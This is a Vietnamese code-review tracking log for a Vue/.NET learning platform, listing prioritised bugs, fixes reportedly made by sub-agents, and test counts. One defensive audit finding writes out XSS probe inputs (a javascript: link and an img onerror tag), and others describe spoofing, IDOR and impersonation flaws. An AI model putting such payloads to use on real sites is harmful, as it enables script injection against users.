**Phương pháp:** 3 góc nhìn (Logic+Backend / UI-UX / Test-Integration) — đã khử trùng lặp, ID NT-001→029 (P0=1, P1=6, P2=14, P3=8). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Backend / Frontend / Tests). Kết quả: backend **754/754 PASS** (+34), frontend **3423/3423 PASS** (192 files, +25), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 21. Ghi chú: TODO nối NotifyBadgeAwarded/LevelUp tại GamificationService (call sites ngoài scope).

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| NT-001 | `notificationApi.ts:33,42,51` + `NotificationsController.cs:16` | **URL contract mismatch**: frontend gọi `/api/v1/concepts/notifications` nhưng backend route là `/api/v1/notifications` → **cả 3 endpoint 404, tính năng chết hoàn toàn**; test assert đúng URL SAI nên vẫn pass (pass giả contract) | Sửa URL 1 đầu + test khớp route thật |

### 🟠 P1

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| NT-002 | `NotificationHub.cs:11,23` + `Program.cs` + `useSignalRStore.ts:95` | **Realtime dead 2 đầu**: hub methods không ai invoke (grep chỉ định nghĩa), `INotificationService` KHÔNG đăng ký DI, `connectNotifications` chỉ test gọi → không code path tạo notification, badge không bao giờ tự cập nhật |
| NT-003 | `NotificationHub.cs:11,23` | **Hub method public cho phép spoof**: user authed invoke SendBadgeNotification(victimId) → gửi event giả tới user khác; không check `userId == Context.UserIdentifier` |
| NT-004 | `useNotificationStore.ts:19` | Store không reset khi đổi user (logout/impersonate) — user B thấy badge + list của user A |
| NT-005 | `NotificationBell.vue:33-45` | Item là `<div @click>` không focusable/role/keydown — keyboard không dùng được |
| NT-006 | `notificationBell.spec.ts:55-78` | Test pass giả phụ thuộc timing — mount → onMounted loadNotifications mock trả [] overwrite; chỉ cần flushPromises là fail |
| NT-007 | (thiếu) | **Backend 0 test Notifications** — controller/service/hub không bảo vệ (IDOR, Take(100), mark-all idempotent) |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| NT-008 | `useNotificationStore.ts:36-38` | 401/expired nuốt im lặng — badge stale vô hạn, không refresh/logout |
| NT-009 | `NotificationBell.vue:106-109` | Không real-time/polling — notification mới không bao giờ tự hiện |
| NT-010 | `NotificationsController.cs:92-106` | MarkAllAsRead load hết unread + loop set + race check-then-set — nên ExecuteUpdateAsync |
| NT-011 | `NotificationsController.cs:42,51` | Take(100) cứng + unreadCount client-side từ 100 bản → >100 unread badge sai |
| NT-012 | `NotificationBell.vue:48-51` | isLoading không dùng — dropdown hiện "Chưa có thông báo" khi đang tải (empty flash giả) |
| NT-013 | `NotificationBell.vue:8-9,20` | Thiếu Esc đóng + aria-expanded/haspopup + dropdown không dialog/focus trap |
| NT-014 | `NotificationBell.vue:8,13-15` | Badge không aria-live + aria-label tĩnh "Thông báo" (không kèm số) |
| NT-015 | `NotificationBell.css:60-73` + `:9` | Dropdown 340px vỡ mobile ≤360px + touch target 30px (<44px WCAG 2.5.8) |
| NT-016 | `NotificationService.cs:29` | NotifyAdminsAsync role "Admin" string literal + query toàn bộ + 1 admin fail cả batch |
| NT-017 | `useNotificationStore.spec.ts` | Coverage gap: unauth no-op, lỗi mark → giữ isRead, isLoading, id lạ không crash |
| NT-018 | `useNotificationStore.ts:28-41` | Race load 2 nơi (mount + toggle) không AbortController/sequence guard — response cũ ghi đè |
| NT-019 | `notificationBell.spec.ts` | Coverage gap: click đã đọc không mark, linkUrl="" không push, tự đóng dropdown, mark-all chỉ khi hasUnread, unmount gỡ listener |
| NT-020 | (thiếu) | IDOR không regression test — user A không đọc/mark được của B |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| NT-021 | `useNotificationStore.ts:51,62` | Mutate object trực tiếp `n.isRead = true` — nên map mảng mới |
| NT-022 | `notificationApi.ts:16-21` | fetch không timeout + handleResponse parse JSON trước khi check content-type |
| NT-023 | `NotificationBell.vue:23-29` | Mark-all không disabled khi pending → double PUT |
| NT-024 | `NotificationBell.vue:86-98` | formatTime không validate "Invalid Date" + ngày tương lai "Vừa xong"; không test |
| NT-025 | `useNotificationStore.ts:35` | List không sort createdAt + ghi đè toàn mảng sau read (stale) — nên merge/diff theo id |
| NT-026 | `NotificationsController.cs:34,64,88` | Controller query DbContext trực tiếp + trích JWT 3 lần — nên service layer |
| NT-027 | `notificationApi.spec.ts:5` | API_BASE hardcode localhost:5055 — CI env khác fail oan |
| NT-028 | `NotificationBell.css:26-38` | bell-ring animation vô hạn mỗi 2s — không prefers-reduced-motion |
| NT-029 | (thiếu) | Service unit test NotifyUser/NotifyAdmins/MarkAsRead thiếu |

---

## 🔬 REVIEW ROUND 22 — 2026-08-11: Core & UI Components (3 sub-agent, 38 lỗi ghi nhận) — ROUND CUỐI CÙNG

**Scope:** `shared/**` (apiClient, useThemeStore, BaseIcon, markdown, Theory*) + `composables/**` (useToast, useModalA11y, useConfetti) + `components/**` (AppHeader, ToastContainer, Skeleton*, ConfirmModal, SortableContextWrapper, CustomMarkdownEditor, SvgIcon).
**Phương pháp:** 3 góc nhìn (Logic+Shared / UI-UX / Test-Integration) — đã khử trùng lặp, ID CU-001→038 (P0=1, P1=9, P2=18, P3=10). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Shared / Components / Tests). Kết quả: frontend **3474/3474 PASS** (197 files, +51), `vue-tsc` 0 lỗi, backend 754/754. Chi tiết fix: `plan/tracking/errors.md` Review Round 22. **HOÀN TẤT TOÀN BỘ 16/16 TÍNH NĂNG — MỌI ROUND REVIEW ĐÃ ĐÓNG.**

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| CU-001 | `CustomMarkdownEditor.vue:257-259` | **XSS stored/reflected**: regex link/image chèn text+URL không escape, không chặn protocol → `[x](javascript:alert(1))` hoặc `<img src=x onerror=...>` chạy trong `v-html` preview | Escape toàn bộ trước + whitelist scheme http/https/mailto + renderer chung sanitize |

### 🟠 P1

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| CU-002 | `ConfirmModal.vue:1-47` | Vi phạm pattern TC-028 — thiếu focus trap/Esc/scroll-lock/restore + role=dialog/aria-modal (13+ modal khác đều chuẩn) |
| CU-003 | `useModalA11y.ts:38` + `:41-52` | watch không `{immediate:true}` → modal mở sẵn không gắn keydown; xếp chồng modal — 1 Esc đóng TẤT CẢ + scroll-lock đếm tham chiếu sai |
| CU-004 | `AppHeader.vue:23` | Nav `hidden lg:flex` — mobile (<1024px) mất trắng menu, chỉ còn spacer; không hamburger/drawer |
| CU-005 | `AppHeader.vue:28-47` | Nav dropdown `group-hover` thuần — không keyboard/focus-within, thiếu aria-expanded/haspopup, không Esc |
| CU-006 | `TheoryAccordionItem.vue:12-16` | Accordion header div @click — không focusable/role/aria-expanded/Enter/Space (WAI-ARIA accordion) |
| CU-007 | `appHeaderP0Tests.spec.ts:8-35` | filteredTabs/isTabVisible copy-paste logic từ component — test tự chứng thực, không mount |
| CU-008 | (thiếu) | **useModalA11y 0 spec** — Esc/trap/shift+Tab/restore/scroll-lock + case mở sẵn show=true |
| CU-009 | (thiếu) | **markdown 0 spec** — XSS escape &<>/script/img onerror + heading/list/code/emoji (output qua v-html) |
| CU-010 | (thiếu) | **useThemeStore 0 spec** — initTheme (localStorage/matchMedia/giá trị lẻ) + applyTheme data-theme |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| CU-011 | `shared/services/apiClient.ts:33-36,54` | Không timeout/AbortController + không guard content-type (text/html → SyntaxError thô) — lệch chuẩn TC-013/NT-022 |
| CU-012 | `shared/services/apiClient.ts:6,21-31` | **Duplicate** với services/apiClient + vi phạm AU-044 (Bearer 2 lớp — main.ts đã là nguồn duy nhất) |
| CU-013 | `useToast.ts:28-40,65-73` | handleApiError không nhận ApiError (nuốt chi tiết backend); toasts duration<=0 vĩnh viễn; clearAll không clear timer |
| CU-014 | `useThemeStore.ts:7-19` + `App.vue:127` | FOUC theme flash (apply trong onMounted) + localStorage/matchMedia không try/catch (Safari private crash) |
| CU-015 | `CustomMarkdownEditor.vue:257-259,236-281` | Regex link chạy trước image → toolbar Image tạo `!<a>` thay `<img>`; renderer markdown thứ 2 trùng shared nhưng khác markup (preview không nhất quán) |
| CU-016 | `useConfetti.ts:8,16-23,31-51` | pendingTimers module-level chéo component (B unmount giết timer A); fireSuccess/firePremium rAF không cancel khi unmount |
| CU-017 | `SortableContextWrapper.vue:1-9` | Dead passthrough — items không dùng, không keyboard/ARIA reorder; mọi test stub |
| CU-018 | `ConfirmModal.vue:88-95` | handleConfirm emit sync — không await async handler parent → loading reset ngay, spinner không hiện |
| CU-019 | `AppHeader.vue:75` | user-badge div @click push /profile — không keyboard/tabindex/role |
| CU-020 | `SkeletonLoader.vue:59` + `SkeletonCard.vue` | Shimmer vô hạn không prefers-reduced-motion + thiếu aria-hidden |
| CU-021 | `TheoryAccordionItem.vue:119-122` | copyCode alert() native + clipboard không try/catch → unhandled rejection non-HTTPS |
| CU-022 | `TheoryCollapsiblePanel.vue:11-19` | Thiếu aria-expanded/aria-controls + focus không vào drawer |
| CU-023 | `CustomMarkdownEditor.vue:6-148,516-518` | Toolbar thiếu aria-label; textarea outline:none mất focus indicator |
| CU-024 | AppHeader tests | 0 component test (logout/openLogin/avatar AU-052/theme icon/responsive/aria) + setAttribute mock không assert + NA-006 readFileSync pass giả |
| CU-025 | Toast tests | Test "icon" chỉ assert class; thiếu cap maxToasts/clearAll/duration=0/handleApiError/progress |
| CU-026 | Skeleton tests | `skeletons >= 3` lỏng (thật 5) + không test variant/rounded/custom size |
| CU-027 | `teacherModals.spec.ts:201-256` | ConfirmModal thiếu test variant/loading/overlay click/icon |
| CU-028 | `uiP2Tests.spec.ts:215-224,24-33` | mockFetchError + localStorage global không restore — rò rỉ isolation |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| CU-029 | `BaseIcon.vue:13-669` vs `SvgIcon.vue` | Duplicate ~40 icon trùng tên + API lệch (strokeWidth/filled) — nên 1 nguồn path data |
| CU-030 | `CustomMarkdownEditor.vue:364-375,377-384` | onInput rỗng; syncScroll querySelector('.preview-pane') global (2 editor vỡ); fullscreen không Esc + unmount không reset body.overflow |
| CU-031 | `useModalA11y.ts:58-61` + spec | Unmount khi mở không restore focus; focus trap chưa test biên (focus ngoài overlay/không focusable) |
| CU-032 | `ToastContainer.vue:3` + css | aria-live polite chung cho error (nên assertive) + role=alert mâu thuẫn; transition không reduced-motion |
| CU-033 | `AppHeader.vue` + `SvgIcon.vue:25-29` + `TheoryCollapsiblePanel.vue:57,113` | z-index 999999 trùng lặp; filled prop không dùng + viewBox thiếu path; bodyRef dead |
| CU-034 | `TheorySummaryView.vue:24-31` | Tag thiếu aria-pressed + font 10px quá nhỏ |
| CU-035 | `toastP0Tests` + `uiP2Tests` | Toast-004 click .toast-item thay .toast-close; Toast/Skeleton test trùng 100% 2 file |
| CU-036 | `appHeaderP0Tests` | document override không restore + localStorage không clear giữa it() |
| CU-037 | `uiP2Tests:602-606` | GT-012 chỉ assert style truthy — không verify giá trị định vị |
| CU-038 | `apiClient.spec` (thiếu) | Không contract spec cho apiClient (timeout/error shape/Bearer/content-type) |

---

## 📊 Thống Kê Tổng

| Feature | P0 | P1 | P2 | P3 | Trạng thái sau chiến dịch fix 2026-08-10 |
|---|---|---|---|---|---|
| Execution Control | 3 | 7 | 10 | ~20 | ✅ Toàn bộ FIXED (tick ticker dùng advanceFrame, replay, clamp speed, debounce, DPI, a11y...) |
| Interactive Playground | 1 | 11 | 12 | ~10 | ✅ Toàn bộ FIXED (importGraph validate, directed 2 chiều, DPR, pointer events, hover, liên thông Dijkstra...) |
| Pseudocode Sync | 3 | 6 | 14 | ~15 | ✅ Toàn bộ FIXED (FrameDTO có logicalId/variables, highlighter viết lại, mount UI vào SortingView, debounce, scroll...) |
| Quiz System | 5 | 14 | 25 | ~10 | ✅ FIXED (trừ QZ-048 ⏳ DEFERRED — cần materialize bank quiz) |
| Cross-cutting | — | — | — | — | ✅ CC-001→010 xử lý; **CC-011 (mới)**: build còn ~143 lỗi TS pre-existing ở dsa-modules renderers/tests (WIP phiên trước: `dataState?` optional chưa được renderers xử lý) — cần batch riêng |
| **Review round 2** (2026-08-10) | — | — | — | — | IP-042/043/044 + EC-048/049 + QZ-053: **✅ toàn bộ FIXED**; CC-012 (warning BaseIcon feature khác) ⏳ OPEN — ngoài scope |
| **Review round 3** (deep, 2026-08-10) | 2 🔴 | 4 🟡 | 3 🟢 | — | QZ-006 nối dây XP sync + IP-045 toast ghi đè (🔴): **✅ FIXED toàn bộ** — frontend **2715/2715 PASS** (+2 test QZ-006) |
| **Review round 5** (re-review, 2026-08-10) | 0 P0 | 3 P1 | 3 P2 | 6 P3 | ✅ Verify: CV-101→140 FIXED; docs 19/22 FIXED (PARTIAL: DC-010, DC-021, DC-C3) · **Lỗi mới: ✅ toàn bộ FIXED (round 5 fix — 4 sub agent)** — CV-141→144, DC-027 (P1 regression link chết), DC-028/029 (P2), DC-030/031 (P3), DC-C8/C10 (P1 content), DC-C9/C11 (P2), DC-C12→C14 (P3) + DC-010/DC-C3 PARTIAL→FIXED; frontend **2790/2790 PASS** (+6 test). Còn lại: DC-021 breadcrumb/search ⏳ DEFERRED |

---

## 🗓️ Lịch Sử Cập Nhật

| Ngày | Nội dung |
|---|---|
| 2026-08-09 | Khởi tạo file. Nhập toàn bộ ~166 lỗi phát hiện từ đợt review 16 sub agent (4 feature × 4 góc nhìn: Logic Engine / Store-State / UI-UX / Test-Integration) |
| 2026-08-10 | **Chiến dịch fix 4 feature — 16 sub agent (4 batch × 4)**: Execution Control (EC-001→047) · Interactive Playground (IP-001→041) · Pseudocode Sync (PS-001→041) · Quiz System (QZ-001→052 + backend). Kết quả: frontend **2712/2712 test PASS**, backend **372/372 PASS** (build 0 lỗi). Chi tiết: fix nối dây thủ công (ticker advanceFrame, importGraph wiring, autoLayout action, isolated flash, QZ-003 `withAnswers=true` cho lesson/teacher/admin, HighlightIndices optional) + cập nhật 8 test pin hành vi cũ. Còn lại: QZ-048 ⏳ DEFERRED, CC-011 pre-existing type drift (dsa-modules). |
| 2026-08-10 (round 2) | **Fix Review Round 2 — 6/6 lỗi**: IP-042 toAdjacencyList directed (bug thật 🔴), IP-043 setZoomLevel action, IP-044 TODO stale, EC-048 BaseIcon chevron, EC-049 alias/hardcode vcrDefaults, QZ-053 stub BaseIcon (quizP2Tests + quizP0Tests — hết warning quiz-system). Kết quả: frontend **2713/2713 test PASS** (+1 test directed). Ghi nhận CC-012 (warning BaseIcon pre-existing ở dsa-modules/export-share/dashboard — ngoài scope). |
| 2026-08-10 (round 3 — deep) | **Fix Deep Review — 9/9 lỗi**: QZ-006 nối dây sync XP (🔴, +2 test), IP-045 toast ghi đè (🔴), IP-046 cache getComputedStyle, IP-047 dọn dead code resetZoom, IP-048/049 toast qua store + GraphView import feedback, EC-050 comment hợp đồng customCompileFn, QZ-054 clamp answers restore, QZ-055 action setBackendQuizError, QZ-056 reassignment. Kết quả: frontend **2715/2715 test PASS**. |
| 2026-08-10 (round 4 fix) | **Fix Review Round 4 — 6 sub agent** (CV-ENGINE 23 ID engine/core · CV-STORE-UI 17 ID store/UI · DC-RENDER 18 ID rendering/nav · DC-CONTENT 8 ID nội dung · CV-TESTS +23 · DC-TESTS +40): CV-101→140 + DC-001→026 + DC-C1→7 + DC-T1→5. Nổi bật: CV-101 dangling promise, CV-102 worker singleton handler, CV-103 sandbox chặn mạng, CV-104 auto-invoke heuristic an toàn, CV-108 LOOP_LIMIT 20000 + 3 spec, CV-115 generation token, DC-001 hamburger mobile, DC-002/003 TOC, DC-C1→3 kiến thức P1. Phục hồi file (mojibake double-encoding). Kết quả: frontend **2784/2784 test PASS** (153 files; code-to-viz 78, docs 42), backend **372/372 PASS**. Còn lại: DC-021 breadcrumb/search ⏳ DEFERRED, CC-011 ⏳ OPEN, CC-012 ⏳ OPEN, QZ-048 ⏳ DEFERRED. |
| 2026-08-10 (round 5 — re-review) | **RE-REVIEW 2 tính năng (7 sub agent verify + tìm mới)**: ✅ xác nhận CV-101→140 FIXED theo code hiện tại (pendingReject, compileWorker map, sandbox che fetch, entry heuristic, truncated flag, LOOP_LIMIT 20000 + spec đồng bộ, ForOf/In guard, 1-vế-member, IIFE, onmessageerror, sentinel); docs 19/22 FIXED. **Lỗi MỚI 13 mục — chưa fix**: CV-141 (race timer glow), CV-142 (tour bước 5 spotlight rỗng), CV-143 (traceAssign variables hardcode), CV-144 (ASSIGN→swap visual); DC-027 🔴 (regression fix DC-002: mọi link nội dung `#/docs/...` chết — preventDefault nuốt link router), DC-028 (deep-link #section không cuộn), DC-029 (slug topic sai fallback ẩn), DC-030/031; DC-C8 🔴 (two-pointers [2,3] vs [3,4]), DC-C10 🔴 (heap extract trace sai SiftDown), DC-C9/C11, DC-C12→C14. PARTIAL: DC-010 (nguồn còn trùng heading), DC-021 (breadcrumb/search), DC-C3 (end marker con thứ 3 P2). |
| 2026-08-10 (round 5 fix) | **Fix Review Round 5 — 4 sub agent** (R5-DC-RENDER 5 ID rendering/nav · R5-DC-CONTENT 8 ID nội dung · R5-CV-UI 2 ID glow+tour · R5-CV-ENGINE 2 ID engine): CV-141 (timer glow race — clear trước set + watcher hasCompileError), CV-142 (tour bước 5 → run-btn luôn tồn tại + test chốt DOM), CV-143 (traceAssign variables tên thật từ MemberExpression property), CV-144 (HighlightIndices thêm `assign?` — ASSIGN tách khỏi swap), DC-027 🔴 (selector `a[href^="#"]:not([href^="#/"])` — link router sống lại, +3 test click), DC-028 (scrollToHashSection sau render 2 thì), DC-029 (`router.replace('/docs/intro/intro')` khi topic lẻ), DC-030 (watch route.path), DC-031 (re-check renderSeq sau await mermaid), DC-C8/C9 (two-pointers [3,4] + diagram Bước 4), DC-C10 (heap `[7,15,8,30,20,25]` — SiftDown dừng), DC-C11 (struct copy theo giá trị, không Deep Copy), DC-C12 (BGP path-vector), DC-C13 (ngữ pháp), DC-C14 (~20 bước) + DC-010 (heading HashSet sửa nguồn, allowlist `{}`) + DC-C3 (end marker nhúng nhãn P2). Kết quả: frontend **2790/2790 PASS** (153 files, +6 test: docs 45, code-to-viz 80, guided 30). Còn lại: DC-021 breadcrumb/search ⏳ DEFERRED · CC-011 ⏳ OPEN · CC-012 ⏳ OPEN · QZ-048 ⏳ DEFERRED. |
| 2026-08-11 (round 7 — Auth) | **Review sâu tính năng Auth đầu tiên trong danh sách UNREVIEW — 4 sub agent** (Logic Engine / Store-State / UI-UX / Test-Integration): ghi nhận **55 lỗi AU-001→055** (P0=3, P1=7, P2=19, P3=26). Nổi bật: refresh rotation race cả 2 hệ (AU-004), statelessInit gọi 2 lần mất session khi khởi động (AU-005), XP queue trôi tài khoản khác khi logout (AU-006), JWT key placeholder commit (AU-009), stateless auth backend zero test (AU-002), session expiry âm thầm (AU-007). |
| 2026-08-11 (round 7 fix — Auth) | **Fix Auth — 4 sub agent song song** (Backend 19 mục · Store-State 11 mục · UI-UX 11 mục + 2 bổ trợ · Tests 9 mục). Nổi bật: refresh rotation transaction + reuse detection + remove-if-match stateless (AU-004), JWT key env-only (AU-009), reset store phụ thuộc + queue gắn userId khi logout (AU-006), toast+redirect session expiry (AU-007), init chỉ clear khi 4xx (AU-008), TTL eviction + refresh data stateless (AU-016), fail-closed ban check (AU-039), focus trap + confirm password (AU-018/019), contract API spec + guard spec mới (AU-001/010). Kết quả: backend **416/416 PASS** (+44 test auth), frontend **2826/2826 PASS** (155 files, +36), `vue-tsc` 0 lỗi. Còn lại: AU-045 PARTIAL (classic authApi giữ vì store còn dùng). |
| 2026-08-11 (round 8 — Payment) | **Review sâu tính năng Payment/Checkout Premium (Phase 1.2) — 4 sub agent** (Logic Engine / Store-State / UI-UX / Test-Integration): ghi nhận **65 lỗi PM-001→065** (P0=5, P1=15, P2=24, P3=21). Nổi bật: **verify cấp premium miễn phí (PM-001 P0)**, stateless dead-end kẹt 'paying' (PM-016 P0), simulate-webhook thiếu ownership (PM-002 P1), order không hết hạn (PM-003 P1), TOCTOU webhook (PM-004), split-brain premium (PM-007), PremiumGate dead UI (PM-020 P1), polling leak (PM-018), 5 test pass giả P0 (PM-049→051). |
| 2026-08-11 (round 8 fix — Payment) | **Fix Payment — 4 sub agent song song** (Backend 15+ test · Store-State 13 · UI-UX 13 · Tests 12). Nổi bật: verify hết cấp premium (PM-001), polling chạy cả 2 branch hết dead-end (PM-016), ExpiresAt 15 phút + migration (PM-003), TOCTOU idempotency + unique index (PM-004), fail-closed config (PM-005), 1 nguồn config giá/bank (PM-006), DB commit trước cache (PM-007), markPremium() thay mutation trực tiếp (PM-021), polling stop khi mất token (PM-018), PremiumGate a11y + retry 1 click, formatVND chung, contract API spec mới (PM-035t). Kết quả: backend **472/472 PASS** (+56), frontend **2846/2846 PASS** (157 files, +20), `vue-tsc` 0 lỗi. Còn lại: PM-053 DEFERRED (countdown timestamp), PM-004 CAS SQL thay bằng re-check+unique+affected-rows. |
| 2026-08-11 (round 9 — Admin) | **Review sâu tính năng Admin Panel (Phase 1.3, hoàn tất Phase 1) — 4 sub agent** (Logic Engine / Store-State / UI-UX / Test-Integration): ghi nhận **60 lỗi AD-001→060** (P0=1, P1=5, P2=33, P3=21). Nổi bật: **impersonate vỡ 401 do thiếu iss/aud (AD-001 P0)**, impersonate không chặn Admin/Teacher target (AD-002), role từ claim không đối chiếu DB → demote bị hồi phục (AD-003), BanUser không audit (AD-004), DeleteUser FK violation (AD-005), dashboard dữ liệu giả Random (AD-006), zero test backend admin (AD-034), impersonate response lệch shape (AD-013), admin cuối không bảo vệ (AD-023). |
| 2026-08-11 (round 9 fix — Admin) | **Fix Admin — 4 sub agent** (Backend 23+test · Frontend Core 21 mục — chạy lại lần 2 vì lần 1 rỗng · Frontend UI 12 mục · Tests 12 mục). Nổi bật: iss/aud cho impersonate token hết 401 (AD-001), chặn impersonate Admin/Teacher (AD-002), RequireJwtRole đối chiếu role DB (AD-003), BanUser ghi audit (AD-004), DeleteUser await + FK Conflict (AD-005), dashboard isFallback deterministic (AD-006), DbContext factory riêng cho audit (AD-008), AuditLog immutable (AD-011), SyncXP cap 50 (AD-012), totalAdmins toàn cục (AD-015), adminRequest timeout+401 retry (AD-019), LAST_ADMIN_PROTECTED 409 (AD-023), dashboard/health đo thật hết fake (AD-021), AdminControllerTests 28 case (AD-034), useAdminApi.spec.ts 13 test (AD-039). Kết quả: backend **507/507 PASS** (+35), frontend **2866/2866 PASS** (158 files, +20), `vue-tsc` 0 lỗi. Còn lại: AD-024/AD-044 PARTIAL (test pin 1-click/native confirm). **Phase 1 HOÀN TẤT (Auth + Payment + Admin).** |
| 2026-08-11 (round 10 — HTML Playground) | **Review sâu HTML Playground (Phase 2.1) — 3 sub agent** (Logic Engine / UI-UX / Test-Integration): ghi nhận **33 lỗi HT-001→033** (P1=4, P2=13, P3=16). Nổi bật: **debouncer vô hiệu — iframe reload mỗi keystroke (HT-001 P1)**, rò rỉ Referer chứa payload code (HT-002), JS runtime error im lặng không error bridge (HT-003), share URL→state không test (HT-004), thiếu base tag/CSP/guard payload (HT-005→007), auto-run không tắt được (HT-009), switch mode mất code (HT-011/012). |
| 2026-08-11 (round 10 fix — HTML Playground) | **Fix HTML Playground — 3 sub agent** (Engine+Core 24 mục · View+Demos 3 mục · Tests 9 mục). Nổi bật: **previewDoc snapshot gating — hết reload mỗi keystroke (HT-001)**, referrerpolicy no-referrer (HT-002), **error bridge postMessage + panel lỗi (HT-003)**, base about:blank + CSP meta (HT-005/007), MAX_PAYLOAD 6000 + toast (HT-006), auto-run toggle (HT-009), split drag handle (HT-010), KeepAlive giữ Monaco + merge ?code= (HT-011/012), PlaygroundView.spec mới (HT-004), demo thực thi 22 demo (HT-032), 4 test null-guard encode string\|null. Kết quả: frontend **2911/2911 PASS** (159 files, +45), `vue-tsc` 0 lỗi. Ghi chú: KeepAlive caveat keydown listener algo (TODO). |
| 2026-08-11 (round 11 — Algo Playground) | **Review sâu Algo Playground + Custom Input (Phase 2.2) — 3 sub agent** (Logic Engine / UI-UX+Store / Test-Integration): ghi nhận **49 lỗi AL-001→049** (P1=9, P2=24, P3=16). Nổi bật: **KeepAlive deactivate — phím tắt + rAF engine sống ngầm (AL-001/002)**, race Play→compile→auto-play chết ngầm (AL-003), stale state đổi demo giữa compile (AL-004), setInput không invalidate (AL-005), custom input race 2 request (AL-006), **5 test pass giả + 2 file spec thiếu (useAlgoAnimation, algoCanvasHelpers)** (AL-007→009), parser lọt Infinity (AL-010), Counting Sort vỡ input rỗng (AL-011). |
| 2026-08-11 (round 11 fix — Algo Playground) | **Fix Algo Playground + Custom Input — 3 sub agent** (Engine 10 mục · Store+UI 17 mục · Tests 22 mục). Nổi bật: KeepAlive onActivated/onDeactivated hết rAF + phím tắt ngầm (AL-001/002), watcher frames play theo store hết race auto-play (AL-003), runSeq++ hết stale frames (AL-004), setInput invalidate (AL-005), requestId+AbortController custom input (AL-006), **useAlgoAnimation.spec 11 test + algoCanvasHelpers.spec 10 test mới** (AL-008/009), minWithFallback thống nhất spread (AL-033), COLORS/roundRect gom helpers (AL-036), setPlaybackSpeed/setRawText actions (AL-040/041). Kết quả: frontend **2942/2942 PASS** (161 files, +31), `vue-tsc` 0 lỗi, backend 507/507. Còn lại: AL-042 PARTIAL (setLimit test pin). |
| 2026-08-11 (round 12 — Sorting Visualizer) | **Review sâu Sorting Visualizer (Phase 2.3, cuối Phase 2) — 3 sub agent** (Logic Engine / UI-UX+Renderer / Test-Integration): ghi nhận **44 lỗi SV-001→044** (P0=1, P1=3, P2=13, P3=27). Nổi bật: **test pass giả order-coupling US-AS-013 (SV-001 P0 — chạy riêng FAIL)**, **cả 7 engine thiếu contract CC-009 → pseudocode/gutter chết im lặng (SV-002 P1)**, MergeSort FLIP animation chết (SV-003), mergeSort n=1 sortedIndices rỗng (SV-004 bug nguồn), generator fail state mâu thuẫn (SV-005), singleton onMounted 1 lần (SV-006), gutter click first-match (SV-007), Math.max spread 7 engine (SV-008), 0 test cho Radix/Controls/4 composable (SV-015). |
| 2026-08-11 (round 12 fix — Sorting Visualizer) | **Fix Sorting Visualizer — 3 sub agent** (Engine 17 mục · UI+Renderer 17 mục · Tests 18 mục). Nổi bật: **CC-009 phủ toàn bộ 7 engine** — SortFrame thêm SortHighlights + logicalId chuẩn từng bước (SV-002) + 21 test contract; fix order-coupling singleton (SV-001); **Merge FLIP theo identity** (SV-003); mergeSort n=1 (SV-004); gutter click gần nhất + snap span (SV-007); enricher Map O(n log k) (SV-009); early-exit bubble (SV-018); matrix 42 cell + perf 100 × 7 engine + race input giữa playback (SV-012→014); sortingComposables.spec 23 test (SV-015). Kết quả: frontend **3058/3058 PASS** (163 files, +116: 99→215 sorting), `vue-tsc` 0 lỗi, backend 507/507. **PHASE 2 HOÀN TẤT (HTML + Algo + Sorting).** |
| 2026-08-11 (round 13 — LMS) | **Review sâu Courses & Lessons LMS (Phase 3.1) — 3 sub agent** (Engine+Backend / UI-UX / Test-Integration): ghi nhận **71 lỗi LM-001→071** (P0=3, P1=19, P2=32, P3=17). Nổi bật: **route trùng PUT/DELETE lessons 500 (LM-001 P0)** + 2 test pass giả P0 (CR-009, US-LN-027), **codelab sandbox không chặn mạng/LOOP_LIMIT (LM-004)**, **XP farm award-xp (LM-006)**, progress không gate publish/premium (LM-005), **race đổi bài ghi nhầm XP (LM-010)**, CompleteLesson không atomic (LM-009), IDOR unlocked-items (LM-007), lộ draft course (LM-008), progress card luôn 0% (LM-014), modal completion dính (LM-012), quizScore scale lệch (LM-021), 0 spec LessonStepCodeLab/lessonApi (LM-017/018). |
| 2026-08-11 (round 13 fix — LMS) | **Fix Courses & Lessons LMS — 3 sub agent** (Backend+Codelab 20 mục · Store+UI 24 mục · Tests 20 mục). Nổi bật: **hết route trùng 500** (LM-001), **codelab sandbox chặn mạng + LOOP_LIMIT 20000 sentinel** (LM-004), **XP không tin client — lấy từ DB lesson.XPReward + rate limit/cap 500/ngày** (LM-006), gate publish/premium cho progress (LM-005), CompleteLesson upsert atomic (LM-009), **race đổi bài hết nhờ isSameLesson sau mỗi await** (LM-010), **quizScore thống nhất 0..100 2 đầu** (LM-021), progress card đếm từ localStorage (LM-014), gate step 2 thật (LM-015), courseAccess.ts gating premium đồng nhất (LM-037), N+1 unlocked gom 1 query (LM-026), lessonStepCodeLab.spec 6 + lessonApi.spec 9 + lessonStoreRace.spec 3 mới (LM-017/018/046). Kết quả: frontend **3086/3086 PASS** (166 files, +28), `vue-tsc` 0 lỗi, backend **507/507**. Còn lại: LM-058 DEFERRED (worker pool TODO). |
| 2026-08-11 (round 14 — Lesson Study) | **Review sâu Lesson Study / Course Modules (Phase 3.2) — 3 sub agent** (Logic+Backend / UI-UX / Test-Integration): ghi nhận **42 lỗi LS-001→042** (P0=5, P1=17, P2=12, P3=8). Nổi bật: **store curriculum thiếu prefix /api/v1 → 404 toàn bộ CRUD (LS-001 P0)**, update/delete item gọi endpoint không tồn tại (LS-002), **reorder drag-drop không wire — chết hoàn toàn (LS-003)**, import-course sai URL + backend thiếu endpoint (LS-004), **ItemFormModal không tạo được bài nào (LS-005)**, **override đứt 3 tầng (LS-009)**, positional args lệch IsHidden (LS-006), student query lộ bài ẩn (LS-007), **ToDictionary composite key → 500 /my-progress (LS-008)**, khóa vĩnh viễn UnlockRuleEngine (LS-010), **0 spec store curriculum/sidebar + pass giả teacherP2 (LS-017/018/020)**, controller 500 thay vì 403/404 (LS-022). |
